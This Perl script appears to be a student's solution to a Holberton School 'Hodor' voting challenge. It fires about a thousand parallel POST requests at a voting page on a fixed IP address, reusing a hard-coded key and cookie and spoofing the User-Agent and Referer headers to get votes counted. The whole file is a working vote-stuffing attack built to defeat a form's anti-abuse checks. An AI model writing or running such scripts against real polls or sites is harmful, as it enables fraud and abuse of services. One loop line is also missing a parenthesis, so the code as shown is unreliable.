#!/usr/bin/perl
use strict;
use warnings;
require LWP::Parallel::RobotUA;         # The robot module.
require WWW::RobotRules::AnyDBM_File;   # Robot rules.
#use LWP::Debug qw(+);                  # Display tons of debugging messages. See 'perldoc LWP::Debug'
use Data::Dump "pp";                    # Used to print the request object, if desired.

=pod
 * ===---Description------------------------------------------------------------===
 *   Solution for the Hodor Project, Level 2 by Julien Barbier.
 *   Using a Perl script with LWP::Parallel:RobotUA to improved performance.
 *
 *   by Alexandro de Oliveira, for Holberton School
 * ===--------------------------------------------------------------------------===
=cut
# Robot Rules:
my $rules = new WWW::RobotRules::AnyDBM_File 'ParallelUA', 'cache';

# LWP is the "Library for WWW in Perl":
my $pua  = LWP::Parallel::RobotUA->new('havk64-robot', '23@holbertonschool.com');

# Defining the URL:
my $url = 'http://173.246.108.142/level2.php';
# Setting the cookie:
my $cookie = "6b695713db9b371a855adf1e229264c681f2e48";
# Setting the body of http request:
my $params = [
    id => "23",
    holdthedoor => 'submit',
    key => $cookie
];

# Setting parameters for concurrency:
$pua->in_order  (1);    # handle requests in order of registration
$pua->duplicates(0);    # ignore duplicates
$pua->timeout   (2);    # in seconds
$pua->redirect  (1);    # follow redirects
$pua->delay     (0);    # delay in seconds.
$pua->max_req   (10);   # max parallel requests per server
$pua->max_hosts (10);   # max parallel servers accessed

# Setting the header:
my $req = HTTP::Request->new(POST => $url);
$req->header(user_agent => "Windows NT 100000000000000 (spoofing the User-Agent) havk64 - Perl script requests");
$req->header(referer => $url);
$req->header(cookie => "HoldTheDoor=$cookie");
$req->content("id=23&holdthedoor=submit&key=6b695713db9b371a855adf1e229264c681f2e48");

# Optionally print the request header(great for learning purposes):
# print pp($pua);
# print pp($req);

# Registering the routines:
for(my $i = 0; $i < (1 << 10; $i++) {
    if(my $res = $pua->register($req)) {
        print STDERR $res->error_as_HTML;
        print "Error";
    }
}
my $entries = $pua->wait();
print pp($entries);
my $counter = 0; # Initializing the voute counter.
foreach (keys %$entries) {
    my $res = $entries->{$_}->response;
    # Making some checks:
    # print "Answer for '",$res->request->url, "' was \t", $res->code,": ", $res->message,"\n";
    # To print the server headers:
    # print $res->headers_as_string;
    my $check = $res->header('Set-Cookie');
    my $pattern = 'HoldTheDoor';
    if(defined($check) && $check =~ m/$pattern/) { # Using regexp to check if the vote was confirmed.
        print "Vote number: @{[$counter + 1]}\n";  # Evaluation and string interpolation.
                $counter++;
    } else {
        print "Post error...(vote not computed)\n";
    }
    # To print the body:
    #print $res->decoded_content();#->headers_as_string;
}

# Printing the total of valid votes.
print "Total of valid votes: $counter\n";
